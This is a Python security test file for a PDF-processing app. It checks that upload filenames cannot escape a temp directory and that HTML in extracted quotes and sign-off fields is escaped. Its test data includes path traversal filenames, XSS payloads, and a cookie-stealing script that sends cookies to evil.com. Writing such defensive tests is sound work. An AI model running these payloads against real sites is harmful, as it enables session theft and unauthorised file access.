"""
Security Hardening Test Suite (test_security_hardening.py)
Validates defenses against:
1. Path Traversal attacks via uploaded filenames (../../evil.pdf)
2. Stored XSS attacks via extracted PDF quotes (<script>alert(1)</script>) and auditor sign-off inputs
3. Session-scoped persistence and temporary directory cleanup
"""

import html
import os
import re
import tempfile
import uuid
from decimal import Decimal

from app import (
    esc,
    safe_fmt,
    sanitize_upload_filename,
    make_safe_temp_path,
    get_active_db_path,
)

def test_path_traversal_protection():
    """
    Validates that user-supplied filenames containing path traversal sequences
    (e.g., '../../evil.pdf') can NEVER escape the bounded temporary directory.
    """
    temp_dir = tempfile.mkdtemp()
    temp_dir_canonical = os.path.realpath(temp_dir)
    
    malicious_filenames = [
        "../../evil.pdf",
        "..\\..\\evil.pdf",
        "../../../../etc/passwd.pdf",
        "..\\..\\..\\Windows\\System32\\cmd.exe.pdf",
        "/absolute/path/override.pdf",
        "C:\\Windows\\system32\\calc.exe.pdf",
        "....//....//nested_traversal.pdf",
    ]
    
    for evil_name in malicious_filenames:
        # 1. Test sanitize_upload_filename directly
        safe_name = sanitize_upload_filename(evil_name, prefix="contract")
        assert ".." not in safe_name, f"Traversal token '..' found in sanitized name: {safe_name}"
        assert "/" not in safe_name, f"Forward slash found in sanitized name: {safe_name}"
        assert "\\" not in safe_name, f"Backslash found in sanitized name: {safe_name}"
        assert safe_name.endswith(".pdf"), f"Safe extension lost: {safe_name}"
        
        # 2. Test make_safe_temp_path bounds check
        safe_path = make_safe_temp_path(temp_dir, evil_name, prefix="contract")
        safe_path_canonical = os.path.realpath(safe_path)
        
        # Must be strictly inside temp_dir
        common = os.path.commonpath([temp_dir_canonical, safe_path_canonical])
        assert common == temp_dir_canonical, (
            f"Path traversal escape detected! Target path '{safe_path_canonical}' "
            f"escaped temp directory '{temp_dir_canonical}'"
        )
        assert os.path.dirname(safe_path_canonical) == temp_dir_canonical, (
            f"Resulting file must reside directly in temp_dir, got {os.path.dirname(safe_path_canonical)}"
        )
        
    print("[PASS] Path traversal protection verified across all malicious payloads.")


def test_stored_xss_protection():
    """
    Validates that HTML tags in extracted PDF content or user inputs are properly
    escaped and cannot execute as raw scripts or image handlers in unsafe_allow_html contexts.
    """
    xss_payloads = [
        ("<script>alert(1)</script>", "&lt;script&gt;alert(1)&lt;/script&gt;"),
        ("<img src=\"x\" onerror=alert('xss')>", "&lt;img src=&quot;x&quot; onerror=alert(&#x27;xss&#x27;)&gt;"),
        ("<b>bold</b>", "&lt;b&gt;bold&lt;/b&gt;"),
        ("<script>alert('$100')</script>", "&lt;script&gt;alert(&#x27;\\$100&#x27;)&lt;/script&gt;"),
    ]
    
    for payload, expected_substring in xss_payloads:
        escaped = esc(payload)
        # Raw tags must NEVER be present
        assert "<script>" not in escaped, f"Raw <script> tag remained unescaped in: {escaped}"
        assert "</script>" not in escaped, f"Raw </script> tag remained unescaped in: {escaped}"
        assert "<img" not in escaped, f"Raw <img> tag remained unescaped in: {escaped}"
        assert "<b>" not in escaped, f"Raw <b> tag remained unescaped in: {escaped}"
        assert expected_substring in escaped, f"Expected '{expected_substring}' not found in '{escaped}'"

    # Specific check: quote containing script tag
    crafted_quoted_text = "<script>alert('Steal Session')</script>"
    rendered_quote_html = (
        f"<div style='font-size:0.8rem; margin-bottom: 4px;'>"
        f"<strong>{esc('linehaul')}</strong>: Page 1 | Conf: 98%<br/>"
        f"<em>\"{esc(crafted_quoted_text)}\"</em></div>"
    )
    assert "<script>" not in rendered_quote_html
    assert "</script>" not in rendered_quote_html
    assert "&lt;script&gt;alert(&#x27;Steal Session&#x27;)&lt;/script&gt;" in rendered_quote_html

    # Specific check: user-typed reviewer signature containing XSS
    crafted_reviewer = "<script>document.location='http://evil.com/?cookie='+document.cookie</script>"
    rendered_kpi_html = f"<div class='kpi-subtext'>Sign-Off: {esc(crafted_reviewer)}</div>"
    assert "<script>" not in rendered_kpi_html
    assert "&lt;script&gt;" in rendered_kpi_html

    print("[PASS] Stored XSS protection verified across all injected tags.")


def test_katex_and_currency_coexistence():
    """
    Validates that real financial figures with dollar signs are escaped with backslashes
    for KaTeX LaTeX prevention while retaining HTML safety.
    """
    currency_str = "$1,352.75"
    escaped_curr = esc(currency_str)
    assert escaped_curr == r"\$1,352.75"

    currency_with_html = "<span>$2,500.00</span>"
    escaped_both = esc(currency_with_html)
    assert r"\$2,500.00" in escaped_both
    assert "&lt;span&gt;" in escaped_both

    print("[PASS] KaTeX dollar escaping and HTML entity escaping coexist safely.")


if __name__ == "__main__":
    test_path_traversal_protection()
    test_stored_xss_protection()
    test_katex_and_currency_coexistence()
    print("\nALL SECURITY HARDENING TESTS PASSED (3/3).")
